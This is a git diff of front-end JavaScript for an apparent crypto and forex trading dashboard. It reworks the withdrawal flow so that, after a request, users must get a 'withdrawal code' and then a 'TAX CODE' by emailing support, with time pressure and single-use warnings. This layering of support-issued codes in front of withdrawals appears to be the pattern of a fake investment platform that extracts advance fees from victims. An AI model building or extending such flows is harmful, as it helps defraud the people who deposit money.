@@ -6,30 +6,6 @@ export function showNotLoggedModal() {
   notLoggedDisplay.classList.add("showNotLogged");
 }
 
-// Deposit methods modal
-document.getElementById("depositBtn").addEventListener("click", toggleModal);
-document
-  .getElementById("closeDepositModal")
-  .addEventListener("click", toggleModal);
-function toggleModal() {
-  document.getElementById("depositModal").classList.toggle("hidden");
-}
-
-// Copy wallet address on click
-document.addEventListener("click", function (e) {
-  if (e.target.classList.contains("wallet")) {
-    const text = e.target.dataset.wallet;
-    navigator.clipboard
-      .writeText(text)
-      .then(() => {
-        alert("Address copied: " + text);
-      })
-      .catch(() => {
-        alert("Failed to copy address.");
-      });
-  }
-});
-
 // TOGGLE PROFILE MODAL
 const toggleButton = document.querySelector(".dp");
 const profileSidebar = document.getElementById("user-sidebar");
@@ -483,13 +459,138 @@ function handleFileChange(event, previewId) {
   }
 }
 
-// LOGIC TO HANDLE SUBMIT TAX CODE
-async function submitTaxCode(e) {
+// Deposit methods modal
+document.getElementById("depositBtn").addEventListener("click", toggleModal);
+document
+  .getElementById("closeDepositModal")
+  .addEventListener("click", toggleModal);
+function toggleModal() {
+  document.getElementById("depositModal").classList.toggle("hidden");
+}
+
+// Copy wallet address on click
+document.addEventListener("click", function (e) {
+  if (e.target.classList.contains("wallet")) {
+    const text = e.target.dataset.wallet;
+    navigator.clipboard
+      .writeText(text)
+      .then(() => {
+        alert("Address copied: " + text);
+      })
+      .catch(() => {
+        alert("Failed to copy address.");
+      });
+  }
+});
+
+// ALL LOGIC FOR WITHDRAWAL MODAL
+// logic to close withdrawal modal
+const withdrawalModal = document.getElementById("withdrawalModal");
+const closeWithdrawalModal = document.getElementById("closeWithdrawalModal");
+closeWithdrawalModal.addEventListener("click", displayBitcoinForm);
+
+// Display withdrawal methods modal
+function displayBitcoinForm() {
+  withdrawalModal.classList.toggle("hidden");
+}
+
+// logic for bitcoin withdraw method
+const bitcoinForm = document.getElementById("bitcoin-form");
+const bankForm = document.getElementById("bank-form");
+
+const bitcoinBtn = document.getElementById("bitcoinBtn");
+bitcoinBtn.addEventListener("click", bitcoinWithdraw);
+function bitcoinWithdraw() {
+  bitcoinForm.classList.remove("hidden");
+  bankForm.classList.add("hidden");
+}
+
+// logic for bank withdrawal
+const bankTransferBtn = document.getElementById("bankTransferBtn");
+bankTransferBtn.addEventListener("click", bankTransferWithdraw);
+function bankTransferWithdraw() {
+  bankForm.classList.remove("hidden");
+  bitcoinForm.classList.add("hidden");
+}
+
+// logic to handle bitcoin and bank submission methods
+const withdrawalForm = document.querySelectorAll(".withdrawalForm");
+withdrawalForm.forEach((form) => {
+  form.addEventListener("submit", withdrawalMethodSubmission);
+});
+async function withdrawalMethodSubmission(e) {
   e.preventDefault();
+  const form = e.target;
+  const formData = new FormData(form);
+  const formObject = {};
+  formData.forEach((value, key) => {
+    formObject[key] = value;
+  });
+
+  // check if balance is enough
+  var amount = parseFloat(formData.get("amount"));
+  if (amount > balanceG) {
+    withdrawalModal.classList.add("hidden");
+    await toast(
+      "info",
+      "Insufficient funds!",
+      "You have tried to withdraw an amount that is greater than your wallet balance. Please reduce the amount."
+    );
+    return;
+  }
+
+  const payload = {
+    amount,
+    username: usernameG,
+    method: formData.get("method"),
+    fullDetails: JSON.stringify(formObject),
+  };
+
+  if (payload.method === "Bitcoin withdrawal") {
+    payload.walletAddress = formData.get("wallet");
+  }
+
+  const submitButton = form.querySelector('button[type="submit"]');
+  try {
+    submitButton.disabled = true;
+    submitButton.innerText = "Processing...";
+
+    const response = await QuestZender(
+      url() + "/dashboard/withdrawal-request",
+      "POST",
+      JSON.stringify(payload),
+      showNotLoggedModal
+    );
+
+    var message = await response.json();
+    if (response.ok) {
+      toast(
+        "success",
+        "Request Sent!",
+        message.data + " To proceed you have to input your withdrawal code."
+      );
+
+      withdrawalModal.classList.add("hidden");
+      chartContainer.innerHTML = menuContentMap.withdrawal.content[0];
+      window.location = "/dashboard/#tradingview-widget";
+      activateWithdrawalCodeSubmission();
+    } else {
+      toast("error", "Withdrawal Request Failed", message.error);
+    }
+  } catch (error) {
+    alert(error);
+  } finally {
+    submitButton.disabled = false;
+    submitButton.innerText = "Proceed";
+  }
+}
+
+// LOGIC TO HANDLE SUBMIT WITHDRAWAL CODE
+async function submitWithdrawalCode() {
   const pin = document.getElementById("withdrawPin").value.trim();
 
   if (!pin) {
-    toast("info", "No Tax Code", "Please enter your tax code.");
+    toast("info", "No Code Provided", "Please enter your unique code.");
     return;
   }
 
@@ -505,133 +606,58 @@ async function submitTaxCode(e) {
     toast("error", "Oops!", message.error);
     return;
   }
-  toast("success", "Verification successful", message.data);
-  handleWithdrawal();
+
+  toast(
+    "success",
+    "Verification successful!",
+    "Withdrawal code verification successful. To proceed you need to provide a TAX CODE next."
+  );
+  // insert tax code form
+  chartContainer.innerHTML = menuContentMap.withdrawal.content[1];
+  activateTaxCodeSubmission();
 }
 
-// HANDLE WITHDRAWAL LOGIC AFTER SUCCESSFUL TAX CODE VERIFICATION
-async function handleWithdrawal() {
-  chartContainer.innerHTML = `
-  <section class="withdraw-section">
-    <form id="withdrawForm">
-      <h2>Place a Withdraw</h2>
-      <p class="subtext">Place a withdraw</p>
-
-      <div class="withdraw-card">
-        <p class="balance-text">Your balance is $ ${balanceG}</p>
-
-        <div class="input-group">
-          <span class="material-icons">person</span>
-          <input type="text" value="${usernameG}" readonly />
-        </div>
-
-        <div class="input-group">
-          <span class="material-icons">attach_money</span>
-          <input type="number" placeholder="Amount" name="amount" id="amount" />
-        </div>
-
-        <label for="method">Select Withdraw Method</label>
-        <select name="method" id="method">
-          <option>Bitcoin</option>
-          <option>Bank Transfer</option>
-          <option>USDT</option>
-        </select>
-
-        <div class="input-group">
-          <i class="fa-solid fa-wallet"></i>
-          <input type="text" placeholder="Wallet address" name="wallet" id="wallet" />
-        </div>
-
-        <button id="proceed">PROCEED</button>
-      </div>
-    </form>
-    
-</section>`;
-
-  {
-    /* <div class="history-card">
-      <h3>My Withdraw History</h3>
-      <table>
-        <thead>
-          <tr>
-            <th>Status</th>
-            <th>Withdraw ID</th>
-            <th>Withdraw Method</th>
-            <th>Amount</th>
-          </tr>
-        </thead>
-        <tbody id="history-body">
-          <!-- Fetched history data will be injected here -->
-        </tbody>
-      </table>
-    </div> */
+// LOGIC TO HANDLE SUBMIT TAX CODE
+async function submitTaxCode() {
+  console.log("first");
+  const pin = document.getElementById("taxPin").value.trim();
+  if (!pin) {
+    toast("info", "No Code Provided", "Please enter your unique code.");
+    return;
   }
-
-  const form = document.getElementById("withdrawForm");
-  const historyBody = document.getElementById("history-body");
-  const proceedBtn = document.getElementById("proceed");
-
-  form.addEventListener("submit", async (e) => {
-    e.preventDefault();
-    proceedBtn.disabled = true;
-    proceedBtn.innerText = "PROCESSING...";
-
-    const formData = new FormData(form);
-    const payload = {
-      amount: parseFloat(formData.get("amount")),
-      method: formData.get("method"),
-      walletAddress: formData.get("wallet"),
-      username: usernameG,
-    };
-
-    try {
-      const response = await QuestZender(
-        url() + "/dashboard/withdrawal-request",
-        "POST",
-        JSON.stringify(payload),
-        showNotLoggedModal
-      );
-      var message = await response.json();
-      if (response.ok) {
-        toast("success", "Request Sent!", message.data);
-        form.reset();
-        // fetchHistory();
-      } else {
-        toast("error", "Withdrawal Request Failed", message.error);
-      }
-    } catch (error) {
-      alert(error);
-    } finally {
-      proceedBtn.disabled = false;
-      proceedBtn.innerText = "PROCEED";
-    }
-  });
-
-  async function fetchHistory() {
-    const response = await QuestZender(
-      "https://fakeapi.com/withdraw/history",
-      "GET",
-      null,
-      showNotLoggedModal
-    );
-    if (!response.ok) return;
-
-    const data = await response.json();
-    historyBody.innerHTML = data
-      .map(
-        (item) => `
-    <tr>
-      <td>${item.status}</td>
-      <td>${item.id}</td>
-      <td>${item.method}</td>
-      <td>$${item.amount}</td>
-    </tr>
-  `
-      )
-      .join("");
+  // verify code with api
+  const response = await QuestZender(
+    url() + `/dashboard/verify-tax-code/?taxCode=${pin}`,
+    "GET",
+    null,
+    showNotLoggedModal
+  );
+  const message = await response.json();
+  if (!response.ok) {
+    toast("error", "Oops!", message.error);
+    return;
   }
+  toast(
+    "success",
+    "Verification successful",
+    message.data +
+      " Your withdrawal request process is complete. Congratulations!"
+  );
+  window.location = "/dashboard/#header";
+}
 
-  // fetchHistory();
+// initialize event listener for withdrawal code form
+function activateWithdrawalCodeSubmission() {
+  // LOGIC TO SUBMIT  WITHDRAWAL CODE
+  const submitWithdrawalCodeBtn = document.getElementById("submit-pin");
+  submitWithdrawalCodeBtn.addEventListener("click", submitWithdrawalCode);
+}
+
+// initialize event listener for tax code form
+function activateTaxCodeSubmission() {
+  // LOGIC TO SUBMIT  TAX CODE
+  const submitTaxCodeBtn = document.getElementById("submitTaxCodeBtn");
+  submitTaxCodeBtn.addEventListener("click", submitTaxCode);
 }
 
 // HANDLE MENU CHANGE
@@ -660,25 +686,64 @@ const menuContentMap = {
   // },
   withdrawal: {
     title: "Withdrawal",
-    content: `
+    content: [
+      `
         <section class="transaction-section">
           <div class="container">
-            <h2 class="withdrawal-title">TAX CODE REQUIRED</h2>
+            <h2 class="withdrawal-title">WITHDRAWAL CODE REQUIRED</h2>
             <p class="description">
-              To initiate a withdrawal process, you need a verified <b>TAX CODE</b>. Contact the Support for the <b>TAX CODE</b> through: <a style="color: dodgerblue" href="mailto:support@skye-trade.com">support@skye-trade.com</a><br>
-              Admin typically responds  <strong>within 2 hours</strong>. Once you've obtained this tax code return here and input below it to initiate the process.
-              <br><br> <b>Disclaimer: </b>Ensure you finish your withdrawal process after you authenticate your tax code as you can not use it again after authentication.
+              To proceed in the withdrawal process, you need to input <b>WITHDRAWAL CODE</b>. Contact the Support for the <b>WITHDRAWAL CODE</b> through: <a style="color: dodgerblue" href="mailto:support@skye-trade.com">support@skye-trade.com</a><br>
+              Admin typically responds  <strong>within 2 hours</strong>. Once you've obtained this withdrawal code return here and input below it to initiate the process.
+              <br><br> <b>Disclaimer: </b>Ensure you finish your withdrawal process after you authenticate your withdrawal code as you can not use it again after authentication.
             </p>
 
             <div class="input-group">
               <span class="icon">🔒</span>
-              <input type="password" id="withdrawPin" placeholder="INPUT TAX CODE" />
+              <input type="password" id="withdrawPin" placeholder="INPUT WITHDRAWAL CODE" />
             </div>
 
-            <button id="submit-pin" class="submit-btn" >AUTHENTICATE TAX CODE</button>
+            <button id="submit-pin" class="submit-btn" >AUTHENTICATE WITHDRAWAL CODE</button>
           </div>
         </section>
       `,
+      `
+      <section class="transaction-section">
+          <div class="container">
+            <h2 class="withdrawal-title">TAX CODE REQUIRED</h2>
+            <p class="description">
+              To finalize the withdrawal process, you need a verified <b>TAX CODE</b>. Contact the Support for the <b>TAX CODE</b> through: <a style="color: dodgerblue" href="mailto:support@skye-trade.com">support@skye-trade.com</a><br>
+              Admin typically responds  <strong>within 2 hours</strong>. Once you've obtained this tax code return here and input below it to complete the process.
+              <br><br> <b>Disclaimer: </b>Ensure you finish your withdrawal process after you authenticate your tax code as you can not use it again after authentication and you would have to start the process over.
+            </p>
+
+            <div class="input-group">
+              <span class="icon">🔒</span>
+              <input type="password" id="taxPin" placeholder="INPUT TAX CODE" />
+            </div>
+
+            <button id="submitTaxCodeBtn" class="submit-btn" >AUTHENTICATE TAX CODE</button>
+          </div>
+        </section> `,
+    ],
+  },
+  history: {
+    title: "Withdrawal history",
+    content: ` <div class="history-card">
+      <h3>My Withdraw History</h3>
+      <table>
+        <thead>
+          <tr>
+            <th>Status</th>
+            <th>Withdraw ID</th>
+            <th>Withdraw Method</th>
+            <th>Amount</th>
+          </tr>
+        </thead>
+        <tbody id="history-body">
+          <!-- Fetched history data will be injected here -->
+        </tbody>
+      </table>
+    </div> `,
   },
   logout: {
     title: "logout",
@@ -686,18 +751,20 @@ const menuContentMap = {
   },
 };
 
+// MENU CONTROLLER FUNCTION
 function loadContent(target) {
-  const contentData = menuContentMap[target];
-  mainContentHeader.textContent = contentData.title;
-  chartContainer.innerHTML = contentData.content;
-
   if (target === "trade") {
     loadTradingView();
   } else if (target === "kyc") {
     loadKycForm();
   } else if (target === "withdrawal") {
-    const submitTaxCodeBtn = document.getElementById("submit-pin");
-    submitTaxCodeBtn.addEventListener("click", submitTaxCode);
+    withdrawalModal.addEventListener(
+      "click",
+      displayBitcoinForm(withdrawalModal)
+    );
+
+    return;
+  } else if (target === "history") {
   } else if (target === "logout") {
     toast("warning", "Logging Out...");
     localStorage.removeItem("auth");
@@ -707,20 +774,12 @@ function loadContent(target) {
   if (tvWidget && target !== "trade") {
     tvWidget = null;
   }
+
+  const contentData = menuContentMap[target];
+  mainContentHeader.textContent = contentData.title;
+  chartContainer.innerHTML = contentData.content;
 }
 
-// function loadContent(target) {
-//   const contentData = menuContentMap[target];
-//   mainContentHeader.textContent = contentData.title;
-//   chartContainer.innerHTML = contentData.content;
-//   if (target === "trade") {
-//     loadTradingView();
-//   } else if (target === "kyc") {
-//     loadKycForm();
-//   } else if (tvWidget) {
-//     tvWidget = null;
-//   }
-// }
 hamburger.addEventListener("click", () => {
   hamburger.classList.toggle("active");
   sidebar.classList.toggle("show");
@@ -737,6 +796,8 @@ overlay.addEventListener("click", () => {
   overlay.classList.remove("show");
   hamburger.querySelector("i").textContent = "menu";
 });
+
+// ATTACH EVENT LISTENERS TO MENU BUTTONS
 sidebarLinks.forEach((link) => {
   link.addEventListener("click", () => {
     const target = link.getAttribute("data-target");
@@ -748,7 +809,4 @@ sidebarLinks.forEach((link) => {
 });
 // loadContent("trade");
 
-window.onload = () => {
-  // loadContent("trade");
-};
 // loadTradingView();
